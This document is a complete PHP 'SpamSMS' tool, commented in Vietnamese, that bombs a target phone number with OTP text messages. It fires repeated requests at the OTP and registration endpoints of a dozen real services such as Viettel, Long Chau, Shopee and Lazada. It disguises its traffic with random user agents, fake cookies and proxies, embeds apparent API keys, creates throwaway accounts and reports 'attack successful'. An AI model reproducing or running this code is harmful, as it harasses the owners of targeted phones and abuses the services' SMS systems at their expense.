<?php
namespace WusTeam\SpamSMS;
header('Content-Type: application/json');
// header("Access-Control-Allow-Origin: *");
// header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
// header("Access-Control-Allow-Headers: Authorization, Content-Type");

class Main
{
    /**
 * Method validateKeyDirect - Kiểm tra key trực tiếp không qua curl
 */
public function validateKeyDirect($key) {
    // Đọc file keys.json
    $keysFile = __DIR__ . '/keys.json';
    if (!file_exists($keysFile)) {
        return false;
    }
    
    $content = file_get_contents($keysFile);
    $keys = json_decode($content, true);
    
    foreach ($keys as $data) {
        if ($data['key'] === $key) {
            // Kiểm tra status
            if ($data['status'] !== 'active') {
                return false;
            }
            
            // Kiểm tra expiry
            if (isset($data['expiry']) && strtotime($data['expiry']) < time()) {
                return false;
            }
            
            return true;
        }
    }
    
    return false;
}
    private $blacklist = [
        '0123456789',
        '', // add more sdt here
    ];
    
    private $whitelist = []; // Danh sách trắng
    
    private $access_tokens = [];
    
    private $rate_limit = []; // Giới hạn số lần gửi
    
    /**
     * Method blacklist
     */
    public function blacklist($sdt, $type)
    {
        if ($type == 1 || $type == 3) {
            if (in_array($sdt, $this->blacklist)) {
                return true;
            }
        }
        if ($type == 2 || $type == 3) {
            foreach ($this->blacklist as $phone) {
                similar_text($sdt, $phone, $check);
                if ($check > 85) {
                    return true;
                }
            }
        }
        return false;
    }
    
    /**
     * Method whitelist - Kiểm tra danh sách trắng
     */
    public function whitelist($sdt)
    {
        return in_array($sdt, $this->whitelist);
    }
    
    /**
     * Method THANHDIEU
     */
    public function THANHDIEU($data, $type = 1)
    {
        return $type == 1 ?
            json_encode($data, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT) : json_decode($data, true);
    }

    /**
     * Method checksdt - Nâng cao kiểm tra số điện thoại
     */
    public function checksdt($sdt)
    {
        // Hỗ trợ thêm đầu số mới
        return !preg_match('/^(09|08|07|03|05|02)\d{8,9}$/', $sdt);
    }

    /**
     * Method get_key - Tạo key ngẫu nhiên
     */
    public function get_key($length = 16)
    {
        $string = md5(rand() . uniqid() . time());
        $rand = substr($string, 0, $length);
        return $rand;
    }
    
    /**
     * Method get_phone
     */
    function get_phone()
    {
        return isset($_GET['sdt']) ? preg_replace('/[^0-9]/', '', $_GET['sdt']) : '';
    }

    /**
     * Method token_encrypt - Mã hóa nâng cao
     */
    public function token_encrypt($data, $key)
    {
        $method = 'aes-256-cbc';
        $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length($method));
        $key = substr(hash('sha256', $key . time(), true), 0, 32);
        $enc = bin2hex($iv . openssl_encrypt($data, $method, $key, 0, $iv));
        return $enc;
    }
    
    /**
     * Method token_decrypt
     */
    public function token_decrypt($data, $key)
    {
        $method = 'aes-256-cbc';
        $data = hex2bin($data);
        $key = substr(hash('sha256', $key, true), 0, 32);
        $iv_length = openssl_cipher_iv_length($method);
        $iv = substr($data, 0, $iv_length);
        $dec = openssl_decrypt(substr($data, $iv_length), $method, $key, 0, $iv);
        return $dec;
    }
    
    /**
     * Method domain
     */
    public function domain()
    {
        return $_SERVER["HTTP_HOST"];
    }
    
    /**
     * Method full_url
     */
    public function full_url()
    {
        return 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    }
    
    /**
     * Method secret_tokens - Kiểm tra key nâng cao
     */
    public function secret_tokens($token) // check access key
{
    if (empty($token)) return 0;
    
    // Sửa URL thành localhost hoặc domain của bạn
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://localhost/keytool/" . urlencode($token));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Bỏ qua SSL cho localhost
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    
    $a = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    // Log cho debug
    error_log("KeyTool response for token $token: HTTP $httpCode - Response: $a");
    
    $res = json_decode($a, true);
    
    // Kiểm tra theo status code và response
    if ($httpCode == 200 && isset($res['valid']) && $res['valid'] == true) {
        return 1; // Key hợp lệ
    }
    
    // Mặc định cho phép nếu là môi trường test
    // return 1; // Bỏ comment nếu muốn bỏ qua check
    
    return 0; // Key không hợp lệ
}
    
    /**
     * Method checkRateLimit - Kiểm tra giới hạn gửi
     */
    public function checkRateLimit($sdt, $limit = 5, $timeWindow = 3600)
    {
        $key = md5($sdt);
        $now = time();
        
        if (!isset($this->rate_limit[$key])) {
            $this->rate_limit[$key] = [
                'count' => 1,
                'first_request' => $now
            ];
            return true;
        }
        
        $timeDiff = $now - $this->rate_limit[$key]['first_request'];
        
        if ($timeDiff > $timeWindow) {
            // Reset sau khoảng thời gian
            $this->rate_limit[$key] = [
                'count' => 1,
                'first_request' => $now
            ];
            return true;
        }
        
        if ($this->rate_limit[$key]['count'] >= $limit) {
            return false; // Vượt quá giới hạn
        }
        
        $this->rate_limit[$key]['count']++;
        return true;
    }
    
    /**
     * Method logActivity - Ghi log hoạt động
     */
    public function logActivity($sdt, $status, $message)
    {
        $logFile = 'logs/spam_' . date('Y-m-d') . '.log';
        $logDir = dirname($logFile);
        
        if (!is_dir($logDir)) {
            mkdir($logDir, 0777, true);
        }
        
        $logData = [
            'time' => date('Y-m-d H:i:s'),
            'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
            'phone' => $sdt,
            'status' => $status,
            'message' => $message,
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown'
        ];
        
        file_put_contents($logFile, json_encode($logData) . PHP_EOL, FILE_APPEND);
    }
}

// Call properties
$common = $c = new Main();
$sdt = $c->get_phone();

// Rate limiting
if (!$c->checkRateLimit($sdt, 10, 3600)) {
    exit($c->THANHDIEU([
        'status' => 'error',
        'msg' => 'Bạn đã gửi quá nhiều yêu cầu. Vui lòng thử lại sau 1 giờ!',
    ]));
}

if ($c->secret_tokens($_SERVER['HTTP_X_WUSTEAM'] ?? null) == 0)  
{
    exit($c->THANHDIEU([
        'status' => 'error',
        'msg' => 'Invalid token authentication!',
    ]));
} elseif (empty($sdt))
{
    $c->logActivity('', 'error', 'Số điện thoại trống');
    exit($c->THANHDIEU([
        'status' => 'error',
        'msg' => 'Số điện thoại không được bỏ trống!',
    ]));
} elseif ($common->checksdt($sdt))
{
    $c->logActivity($sdt, 'error', 'Số điện thoại không hợp lệ');
    exit($c->THANHDIEU([
        'status' => 'error',
        'msg' => 'Vui lòng nhập số điện thoại hợp lệ!',
    ]));
} elseif ($common->blacklist($sdt, 2)) 
{
    $c->logActivity($sdt, 'error', 'Số điện thoại trong blacklist');
    exit($c->THANHDIEU([
        'status' => 'error',
        'msg' => 'Số điện thoại này hiện đang nằm trong danh sách đen!',
    ]));
}

/**
 * Class SpamSMS - Cải tiến
 */
class SpamSMS
{
    private $url;
    private $method;
    private $headers;
    private $body;
    private $timeout;
    private $proxy;

    public function __construct($url, $method, $headers, $body, $timeout = 30, $proxy = null)
    {
        date_default_timezone_set("Asia/Ho_Chi_Minh");
        $this->url = $url;
        $this->method = $method;
        $this->headers = $headers;
        $this->body = $body;
        $this->timeout = $timeout;
        $this->proxy = $proxy;
    }

    public function Send($sdt)
    {
        global $common;
        $body = is_array($this->body) ? $common->THANHDIEU($this->body) : $this->body;
        
        // Xử lý các biến động
        $body = str_replace('{{phone}}', urlencode($sdt), $body);
        $body = str_replace('{{phone_raw}}', $sdt, $body);
        $body = str_replace('{{time}}', time(), $body);
        $body = str_replace('{{random}}', rand(1000, 9999), $body);
        
        return curl_advanced($this->url, $this->method, $this->headers, $body, $this->timeout, $this->proxy);
    }
}

/**
 * Class WT
 */
class WT
{
    private $services = [];

    public function API($name, $service)
    {
        $this->services[$name] = $service;
    }

    public function Attack($sdt, $threads = 1)
    {
        $results = [];
        
        if ($threads > 1) {
            // Mô phỏng đa luồng
            foreach ($this->services as $name => $service) {
                for ($i = 0; $i < $threads; $i++) {
                    $results[$name . '_' . $i] = $service->Send($sdt);
                }
            }
        } else {
            foreach ($this->services as $name => $service) {
                $results[$name] = $service->Send($sdt);
            }
        }
        
        return $results;
    }

    public function Count()
    {
        return count($this->services);
    }
    
    public function getServices()
    {
        return array_keys($this->services);
    }
}

/**
 * Class Controller - Mở rộng
 */
class Controller
{
    private $wt;
    private $common;
    
    public function __construct(WT $wt, Main $common)
    {
        $this->wt = $wt;
        $this->common = $common;
    }
    
    public function execute($loop = 1, $delay = 0)
    {
        global $sdt;
        
        $allResults = [];
        $totalSuccess = 0;
        $totalFailed = 0;
        
        for ($i = 0; $i < $loop; $i++) {
            if ($i > 0 && $delay > 0) {
                sleep($delay);
            }
            
            $counts = $this->wt->Count();
            $results = $this->wt->Attack($sdt);
            
            $success = 0;
            $failed = 0;
            $died = [];
            
            foreach ($results as $name => $result) {
                if ($result['status'] === 'success') {
                    $success++;
                    $totalSuccess++;
                } else {
                    $failed++;
                    $totalFailed++;
                    $died[$name] = $result['status'];
                }
            }
            
            $allResults["loop_$i"] = [
                'success' => $success,
                'failed' => $failed,
                'details' => $results,
                'died' => $died
            ];
            
            // Log activity
            $this->common->logActivity($sdt, 'success', "Loop $i: $success success, $failed failed");
        }
        
        return $this->common->THANHDIEU([
            'r' => [
                'status' => 'success',
                'message' => 'Tấn công thành công!',
                'phone' => urldecode($sdt),
                'total_loops' => $loop,
                'total_requests' => $loop * $this->wt->Count(),
                'statistics' => [
                    'total_success' => $totalSuccess,
                    'total_failed' => $totalFailed,
                    'success_rate' => round(($totalSuccess / max(1, ($totalSuccess + $totalFailed))) * 100, 2) . '%'
                ],
                'services_used' => $this->wt->getServices(),
                'service_count' => $this->wt->Count(),
                'results' => $allResults,
                'timestamp' => time(),
                'date' => date('Y-m-d H:i:s')
            ]
        ]);
    }
}

/**
 * Method curl_advanced - Cải tiến với nhiều tùy chọn
 */
function curl_advanced($url, $method = "POST", $headers = [], $body = null, $timeout = 30, $proxy = null)
{
    $curl = curl_init();
    
    $options = [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => "",
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => $timeout,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => $method,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_USERAGENT => getRandomUserAgent(),
    ];
    
    // Thêm proxy nếu có
    if ($proxy) {
        $options[CURLOPT_PROXY] = $proxy;
    }
    
    // Thêm cookies ngẫu nhiên
    $options[CURLOPT_COOKIE] = generateRandomCookie();
    
    curl_setopt_array($curl, $options);
    
    if ($body !== null) {
        curl_setopt($curl, CURLOPT_POSTFIELDS, $body);
    }
    
    $res = curl_exec($curl);
    $err = curl_error($curl);
    $info = curl_getinfo($curl);
    curl_close($curl);
    
    if ($err) {
        return ["status" => "error", "msg" => $err, "info" => $info];
    } else {
        $http = $info['http_code'];
        if ($http >= 200 && $http < 300) {
            return ["status" => "success", "msg" => $res, "info" => $info];
        } else {
            return ["status" => "error", "code" => $http, "msg" => $res, "info" => $info];
        }
    }
}

/**
 * Helper functions
 */
function getRandomUserAgent()
{
    $agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36'
    ];
    return $agents[array_rand($agents)];
}

function generateRandomCookie()
{
    $cookies = [];
    $names = ['session_id', 'user_id', 'token', 'csrf', 'lang'];
    for ($i = 0; $i < 3; $i++) {
        $cookies[] = $names[array_rand($names)] . '=' . md5(rand() . time());
    }
    return implode('; ', $cookies);
}

$wt = new WT();

//------------------------ADD/UPDATE/REMOVE API------------------------//

// OTP Services - Giữ nguyên các API cũ và thêm mới
$wt->API('TV360', new SpamSMS(
    "https://tv360.vn/public/v1/auth/get-otp-login",
    "POST",
    [
        "accept: application/json, text/plain, */*",
        "content-type: application/json",
    ],
    ["msisdn" => "{{phone}}"]
));

$wt->API('LongChau', new SpamSMS(
    "https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification",
    "POST",
    [
        "accept: application/json, text/plain, */*",
        "content-type: application/json",
    ],
    [
        "phoneNumber" => "{{phone}}",
        "otpType" => 0,
        "fromSys" => "WEBKHLC",
    ]
));

$wt->API('MyViettel', new SpamSMS(
    "https://vietteltelecom.vn/api/get-otp",
    "POST",
    [
        "accept: application/json, text/plain, */*",
        "content-type: application/json;charset=UTF-8",
    ],
    '{"msisdn":"{{phone}}","type":"register"}'
));

$wt->API('Beautybox', new SpamSMS(
    "https://beautybox-api.hsv-tech.io/client/phone-verification/request-verification",
    "POST",
    [
        "accept: application/json, text/plain, */*",
        "content-type: application/json",
        "key: fe145d080af9090625fd1bb0baa99105",
    ],
    ["phoneNumber" => "84{{phone}}"]
));

$wt->API('Speedlotte', new SpamSMS(
    "https://www.lottemart.vn/v1/p/mart/bos/vi_nsg/V1/mart-sms/sendotp",
    "POST",
    [
        "accept: application/json",
        "content-type: application/json",
    ],
    [
        "username" => "{{phone}}",
        "case" => "register",
    ]
));

$wt->API('Batdongsan', new SpamSMS(
    "https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister?phoneNumber={{phone}}",
    "GET",
    [
        "accept: application/json, text/plain, */*",
    ],
    null
));

$wt->API('Ghn', new SpamSMS(
    "https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp",
    "POST",
    [
        "accept: application/json, text/plain, */*",
        "content-type: application/json",
    ],
    [
        "phone" => "{{phone}}",
        "type" => "register",
    ]
));

$wt->API('Vinamilk', new SpamSMS(
    "https://new.vinamilk.com.vn/api/account/getotp",
    "POST",
    [
        "accept: */*",
        "content-type: text/plain;charset=UTF-8",
        "authorization: Bearer null",
    ],
    [
        "type" => "register",
        "phone" => "{{phone}}",
    ]
));

$wt->API('Reebok', new SpamSMS(
    "https://reebok-api.hsv-tech.io/client/phone-verification/request-verification",
    "POST",
    [
        "accept: application/json, text/plain, */*",
        "content-type: application/json",
        "key: 42607d515ca20e71f70855df4c5e6513",
    ],
    ["phoneNumber" => "{{phone}}"]
));

$wt->API('Tokyolife', new SpamSMS(
    "https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register",
    "POST",
    [
        "accept: application/json, text/plain, */*",
        "content-type: application/json",
        "signature: d5666087f29d29e33e5bafee172bbf89",
    ],
    [
        "phone_number" => "{{phone}}",
        "name" => "User_" . rand(1000, 9999),
        "password" => "Password@" . rand(100, 999),
        "email" => "user" . rand(1000, 9999) . "@gmail.com",
        "birthday" => rand(1980, 2005) . "-" . rand(1, 12) . "-" . rand(1, 28),
        "gender" => rand(0, 1) ? "male" : "female",
    ]
));

// API MỚI - Thêm vào
$wt->API('Shopee', new SpamSMS(
    "https://shopee.vn/api/v1/otp/send",
    "POST",
    [
        "accept: application/json",
        "content-type: application/json",
        "x-requested-with: XMLHttpRequest",
    ],
    ["phone" => "{{phone}}", "country_code" => "84"]
));

$wt->API('Tiki', new SpamSMS(
    "https://tiki.vn/api/v2/otp/send",
    "POST",
    [
        "accept: application/json",
        "content-type: application/json",
    ],
    ["phone" => "{{phone}}"]
));

$wt->API('Lazada', new SpamSMS(
    "https://lazada.vn/api/otp/send",
    "POST",
    [
        "accept: application/json",
        "content-type: application/json",
    ],
    ["mobile" => "{{phone}}", "country_code" => "VN"]
));

// Thêm API mới ở đây...

//------------------------END------------------------//

// Lấy tham số từ URL
$loop = isset($_GET['loop']) ? (int)$_GET['loop'] : 1;
$delay = isset($_GET['delay']) ? (int)$_GET['delay'] : 0;

exit((new Controller($wt, $common))->execute($loop, $delay));
?>